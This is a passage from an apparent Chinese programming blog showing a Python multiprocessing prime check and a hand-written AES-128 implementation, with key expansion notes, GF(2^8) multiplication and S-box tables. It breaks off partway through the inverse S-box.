核心数作为最大并发数</span><br>    <span class="hljs-keyword">with</span> ProcessPoolExecutor(max_workers=max_workers) <span class="hljs-keyword">as</span> executor:<br>        <span class="hljs-keyword">for</span> result <span class="hljs-keyword">in</span> executor.<span class="hljs-built_in">map</span>(is_prime, PRIMES):<br>            results.append(result)<br><br>    <span class="hljs-comment"># 最后统一输出结果</span><br>    <span class="hljs-keyword">for</span> res <span class="hljs-keyword">in</span> results:<br>        <span class="hljs-built_in">print</span>(res)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    PRIMES = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">input</span>().split(<span class="hljs-string">&quot;,&quot;</span>)))<br>    main()<br><br></code></pre></td></tr></table></figure><h2 id="python手搓AES-128"><a href="#python手搓AES-128" class="headerlink" title="python手搓AES-128"></a>python手搓AES-128</h2><p>AES需要的步骤：扩展密钥，及10轮操作。前九轮操作为轮密钥加、字节代替、行移位、列混淆。最后一轮没有列混淆。</p><h3 id="密钥扩展"><a href="#密钥扩展" class="headerlink" title="密钥扩展"></a>密钥扩展</h3><p>​4个字（16字节）的密钥扩展为44个字的密钥。</p><p>​以下是伪代码（来自密码编码学域网络安全-原理与实践（第八版））</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202411261609371.png" alt="image-20241120170318310"></p><p>​其中，subword是s盒变换，RotWord是行循环左移1位，Rcon是轮常量，Rcon[j] &#x3D; [Rc[j],0,0,0]。RC[j]的初始值为1，后续是前一项乘2（注意，这里的乘法都是有限域上的乘法）</p><p>​注意，这里需要将输入的密钥以ascii码存储，用二维列表w[44] [4]来存储它们</p><ul><li>进行字符串的转化时的问题：</li></ul><p>​当字节型数据与字符混合在一个字符串中时，单独提取的一个数据会被转化为整数，即字节型数据单独提取时会化为整数。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202411261609777.png" alt="image-20241120193742293"></p><ul><li><p>注意，RC在数组中时从0开始的，书上时从1开始的，调用数组时要减1</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust">temp = [<span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">Sbox</span>(a ^ b) <span class="hljs-keyword">for</span> <span class="hljs-title class_">a</span>, b <span class="hljs-keyword">in</span> <span class="hljs-title function_ invoke__">zip</span>(<span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">Rotword</span>(temp), [<span class="hljs-keyword">self</span>.RC[i <span class="hljs-comment">// 4 - 1], 0, 0, 0])]</span><br></code></pre></td></tr></table></figure></li><li><p>注意，在Rotword时，不要把原本的密钥的顺序移位了，创建一个新列表，深拷贝数据，然后再移位。</p></li><li><p>在以4为倍数的密钥扩展时，是先把行移位的temp进行S盒变换，再进行异或。</p></li><li><p>数据往4*4的矩阵是按列填充的。</p></li><li><p>在一维列表（4*4）中，行列转置的方法：</p></li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">text_t = [[<span class="hljs-type">text</span>[i + j * <span class="hljs-number">4</span>] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">4</span>)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">4</span>)]<br>text_t = [item <span class="hljs-keyword">for</span> <span class="hljs-keyword">row</span> <span class="hljs-keyword">in</span> text_t <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> <span class="hljs-keyword">row</span>]<br></code></pre></td></tr></table></figure><p>第一行提取出列，并且生成二维矩阵，第二行将其扁平化为一维矩阵。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> b2a_hex, a2b_hex<br><span class="hljs-keyword">import</span> copy<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">aestest</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, key</span>):<br>        <span class="hljs-variable language_">self</span>.key = key<br>        <span class="hljs-variable language_">self</span>.pad_len = <span class="hljs-number">0</span><br>        <span class="hljs-variable language_">self</span>.RC = [<span class="hljs-number">0x01</span>]  <span class="hljs-comment"># 初始化为 GF(2^8) 的 1</span><br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>            <span class="hljs-variable language_">self</span>.RC.append(<span class="hljs-variable language_">self</span>.gf_mul(<span class="hljs-variable language_">self</span>.RC[-<span class="hljs-number">1</span>], <span class="hljs-number">0x02</span>))  <span class="hljs-comment"># 每次乘以 x （0x02 在 GF(2^8) 表示 x）</span><br>        <span class="hljs-variable language_">self</span>.exkey = <span class="hljs-variable language_">self</span>.key_extend()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">gf_mul</span>(<span class="hljs-params">self, a, b, mod=<span class="hljs-number">0x11B</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        在有限域 GF(2^8) 中计算 a 和 b 的乘积。</span><br><span class="hljs-string">        参数:</span><br><span class="hljs-string">            a (int): 被乘数</span><br><span class="hljs-string">            b (int): 乘数</span><br><span class="hljs-string">            mod (int): 模多项式 (默认使用 0x11B，对应 AES 标准)</span><br><span class="hljs-string">        返回:</span><br><span class="hljs-string">            int: 乘积在 GF(2^8) 上的结果</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        result = <span class="hljs-number">0</span>  <span class="hljs-comment"># 初始化结果</span><br>        <span class="hljs-keyword">while</span> b &gt; <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">if</span> b &amp; <span class="hljs-number">1</span>:<br>                result ^= a  <span class="hljs-comment"># XOR 累加</span><br>            a &lt;&lt;= <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> a &amp; <span class="hljs-number">0x100</span>:  <span class="hljs-comment"># 检查第 9 位</span><br>                a ^= mod  <span class="hljs-comment"># 模多项式约简</span><br><br>            <span class="hljs-comment"># 右移 b，处理下一位</span><br>            b &gt;&gt;= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Rotword</span>(<span class="hljs-params">self, w</span>):<br>        <span class="hljs-comment"># 向左移动1位</span><br>        w.append(w.pop(<span class="hljs-number">0</span>))<br>        <span class="hljs-keyword">return</span> w<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">key_extend</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        密钥扩展</span><br><span class="hljs-string">        :return:返回扩展密钥</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        w = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>):<br>            words = <span class="hljs-variable language_">self</span>.key[i * <span class="hljs-number">4</span>:i * <span class="hljs-number">4</span> + <span class="hljs-number">4</span>]<br>            words_list = []<br><br>            <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> words:  <span class="hljs-comment"># 针对直接输入16进制数的输入测试案例的转化</span><br>                words_list.append(<span class="hljs-built_in">int</span>(char))<br><br>            w.append(words_list)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>, <span class="hljs-number">44</span>):<br>            temp = copy.deepcopy(w[i - <span class="hljs-number">1</span>])<br>            <span class="hljs-keyword">if</span> i % <span class="hljs-number">4</span> == <span class="hljs-number">0</span>:<br>                temp = [<span class="hljs-variable language_">self</span>.Sbox(a) ^ b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(<span class="hljs-variable language_">self</span>.Rotword(temp), [<span class="hljs-variable language_">self</span>.RC[i // <span class="hljs-number">4</span> - <span class="hljs-number">1</span>], <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>])]<br>            w.append([a ^ b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(w[i - <span class="hljs-number">4</span>], temp)])<br>        w_t = []<br><br>        <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                temp = []  <span class="hljs-comment"># 注意位置，不能放在上面。否则会改变w_t中其他位置的值</span><br>                <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                    temp.append(w[<span class="hljs-number">4</span> * m + j][i])<br>                w_t.append(temp)<br><br>        <span class="hljs-comment"># for lists in w_t:</span><br>        <span class="hljs-comment">#     for char in lists:</span><br>        <span class="hljs-comment">#         print(f&#x27;&#123;hex(char)&#125; &#x27;,end=&#x27;&#x27;)</span><br>        <span class="hljs-comment">#     print(&#x27;&#x27;)</span><br>        <span class="hljs-keyword">return</span> w_t<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Sbox</span>(<span class="hljs-params">self, b</span>):<br>        sbox = (<br>            <span class="hljs-number">0x63</span>, <span class="hljs-number">0x7c</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x76</span>,<br>            <span class="hljs-number">0xca</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0xd4</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xc0</span>,<br>            <span class="hljs-number">0xb7</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x15</span>,<br>            <span class="hljs-number">0x04</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x75</span>,<br>            <span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x84</span>,<br>            <span class="hljs-number">0x53</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xfc</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xcb</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xcf</span>,<br>            <span class="hljs-number">0xd0</span>, <span class="hljs-number">0xef</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0xa8</span>,<br>            <span class="hljs-number">0x51</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xd2</span>,<br>            <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x73</span>,<br>            <span class="hljs-number">0x60</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0xdb</span>,<br>            <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x79</span>,<br>            <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0xea</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x08</span>,<br>            <span class="hljs-number">0xba</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x8a</span>,<br>            <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x9e</span>,<br>            <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xdf</span>,<br>            <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0x16</span>)<br>        <span class="hljs-keyword">return</span> sbox[b]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Sbox_inv</span>(<span class="hljs-params">self, b</span>):<br>        sbox_inv = (<br>            <span class="hljs-number">0x52</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0xfb</span>,<br>            <span class="hljs-number">0x7c</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xcb</span>,<br>            <span class="hljs-number">0x54</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0x4e</span>,<br>            <span class="hljs-number">0x08</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x25</span>,<br>            <span class="hljs-number">0x72</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x92</span>,<br>            <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x84</span>,<br>            <span class="hljs-number">0x90</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x06</span>,<br>            <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0xca</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0x6b</span>,<br>            <span class="hljs-number">0x3a</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x41</span>, <span 